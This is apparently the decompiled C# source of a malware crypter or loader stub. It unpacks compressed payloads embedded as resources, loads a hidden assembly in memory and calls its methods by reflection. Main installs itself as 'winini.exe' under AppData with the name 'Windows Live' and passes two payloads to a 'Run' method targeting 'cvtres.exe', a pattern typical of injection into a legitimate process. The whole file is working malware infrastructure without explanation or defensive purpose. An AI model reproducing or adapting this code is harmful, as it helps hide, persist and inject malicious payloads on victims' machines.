using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

internal class Sheeit
{
	private static class ResourceReader
	{
		private const uint MASK = 15u;

		[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
		public static extern IntPtr GetModuleHandle(string lpModuleName);

		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);

		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern uint SizeofResource(IntPtr hModule, IntPtr hResInfo);

		public static byte[] GetResource(string name)
		{
			return Decompress(ReadResource(1, name.ToUpper()));
		}

		private static byte[] CombineBytes(params byte[][] bytes)
		{
			byte[] array = new byte[0];
			int num = 0;
			foreach (byte[] array2 in bytes)
			{
				Array.Resize(ref array, array.Length + array2.Length);
				Buffer.BlockCopy(array2, 0, array, num, array2.Length);
				num += array2.Length;
			}
			return array;
		}

		private static byte[] ReadResource(int id, string name)
		{
			IntPtr moduleHandle = GetModuleHandle(Application.get_ExecutablePath());
			IntPtr hResInfo = FindResource(moduleHandle, id.ToString(), name);
			IntPtr source = LoadResource(moduleHandle, hResInfo);
			uint num = SizeofResource(moduleHandle, hResInfo);
			byte[] array = new byte[num];
			Marshal.Copy(source, array, 0, (int)num);
			return array;
		}

		private unsafe static byte[] Decompress(byte[] compressed)
		{
			int num = compressed.Length;
			byte[] array;
			int num2;
			do
			{
				num *= 4;
				array = new byte[num];
				fixed (byte* compressedBuffer = compressed)
				{
					fixed (byte* decompressedBuffer = array)
					{
						num2 = Decompress(compressedBuffer, decompressedBuffer, compressed.Length, array.Length);
					}
				}
			}
			while (num2 < 0 || array.Length < num2);
			byte[] array2 = new byte[num2];
			Buffer.BlockCopy(array, 0, array2, 0, array2.Length);
			return array2;
		}

		private unsafe static int Decompress(byte* compressedBuffer, byte* decompressedBuffer, int compressedSize, int maxDecompressedSize)
		{
			fixed (sbyte* ptr7 = new sbyte[8] { 0, 3, 2, 3, 0, 0, 0, 0 })
			{
				byte* ptr = compressedBuffer;
				byte* ptr2 = ptr + compressedSize;
				byte* ptr3 = decompressedBuffer;
				byte* ptr4 = ptr3 + maxDecompressedSize;
				while (true)
				{
					if (ptr < ptr2)
					{
						byte b = *(ptr++);
						int num;
						if ((num = b >> 4) == 15L)
						{
							int num2 = 255;
							while (ptr < ptr2 && num2 == 255)
							{
								num2 = *(ptr++);
								num += num2;
							}
						}
						byte* ptr5 = ptr3 + num;
						if (ptr5 <= ptr4 - 8 && ptr + num <= ptr2 - 8)
						{
							do
							{
								*(int*)ptr3 = *(int*)ptr;
								ptr3 += 4;
								ptr += 4;
								*(int*)ptr3 = *(int*)ptr;
								ptr3 += 4;
								ptr += 4;
							}
							while (ptr3 < ptr5);
							ptr -= ptr3 - ptr5;
							ptr3 = ptr5;
							byte* ptr6 = ptr5 - (int)(*(ushort*)ptr);
							ptr += 2;
							if (ptr6 < decompressedBuffer)
							{
								break;
							}
							if ((num = b & 0xF) == 15L)
							{
								while (ptr < ptr2)
								{
									int num2 = *(ptr++);
									num += num2;
									if (num2 != 255)
									{
										break;
									}
								}
							}
							if (ptr3 - ptr6 < 4L)
							{
								*(ptr3++) = *(ptr6++);
								*(ptr3++) = *(ptr6++);
								*(ptr3++) = *(ptr6++);
								*(ptr3++) = *(ptr6++);
								ptr6 -= ptr7[ptr3 - ptr6];
								*(int*)ptr3 = *(int*)ptr6;
								ptr3 = ptr3;
								ptr6 = ptr6;
							}
							else
							{
								*(int*)ptr3 = *(int*)ptr6;
								ptr3 += 4;
								ptr6 += 4;
							}
							ptr5 = ptr3 + num;
							if (ptr5 > ptr4 - 8)
							{
								if (ptr5 > ptr4)
								{
									break;
								}
								do
								{
									*(int*)ptr3 = *(int*)ptr6;
									ptr3 += 4;
									ptr6 += 4;
									*(int*)ptr3 = *(int*)ptr6;
									ptr3 += 4;
									ptr6 += 4;
								}
								while (ptr3 < ptr4 - 8);
								while (ptr3 < ptr5)
								{
									*(ptr3++) = *(ptr6++);
								}
								ptr3 = ptr5;
								if (ptr3 == ptr4)
								{
									break;
								}
							}
							else
							{
								do
								{
									*(int*)ptr3 = *(int*)ptr6;
									ptr3 += 4;
									ptr6 += 4;
									*(int*)ptr3 = *(int*)ptr6;
									ptr3 += 4;
									ptr6 += 4;
								}
								while (ptr3 < ptr5);
								ptr3 = ptr5;
							}
							continue;
						}
						if (ptr5 > ptr4 || ptr + num > ptr2)
						{
							break;
						}
						CopyMemory(ptr3, ptr, num);
						ptr3 += num;
						ptr += num;
						if (ptr < ptr2)
						{
							break;
						}
					}
					return (int)(ptr3 - decompressedBuffer);
				}
				return (int)(-(ptr - compressedBuffer));
			}
		}

		private unsafe static void CopyMemory(byte* dst, byte* src, long length)
		{
			while (length >= 16L)
			{
				*(long*)dst = *(long*)src;
				dst += 8;
				src += 8;
				*(long*)dst = *(long*)src;
				dst += 8;
				src += 8;
				length -= 16L;
			}
			if (length >= 8L)
			{
				*(long*)dst = *(long*)src;
				dst += 8;
				src += 8;
				length -= 8L;
			}
			if (length >= 4L)
			{
				*(int*)dst = *(int*)src;
				dst += 4;
				src += 4;
				length -= 4L;
			}
			if (length >= 2L)
			{
				*(short*)dst = *(short*)src;
				dst += 2;
				src += 2;
				length -= 2L;
			}
			if (length != 0L)
			{
				*dst = *src;
			}
		}
	}

	private static List<Thread> Threads = new List<Thread>();

	private static Random R = new Random();

	private static void Main()
	{
		Invoke("Begin", new object[3]
		{
			"Windows Live",
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).Replace("Roaming", ""), "winini.exe"),
			true
		});
		Invoke("Run", new object[4]
		{
			"cvtres.exe",
			ResourceReader.GetResource("Qhwq"),
			ResourceReader.GetResource("Vnt"),
			false
		});
		foreach (Thread thread in Threads)
		{
			thread.Join();
		}
	}

	private static void Invoke(string name, object[] values)
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			Invoker(name, values);
		});
		thread.SetApartmentState(ApartmentState.STA);
		thread.Start();
		Threads.Add(thread);
	}

	private static object Invoker(string name, object[] values)
	{
		Assembly assembly = AppDomain.CurrentDomain.Load(ResourceReader.GetResource("Dpnlu"));
		MethodInfo[] methods = assembly.GetType("Ax")!.GetMethods();
		int i;
		for (i = 0; methods[i].Name != name; i++)
		{
		}
		return methods[i].Invoke(null, values);
	}
}
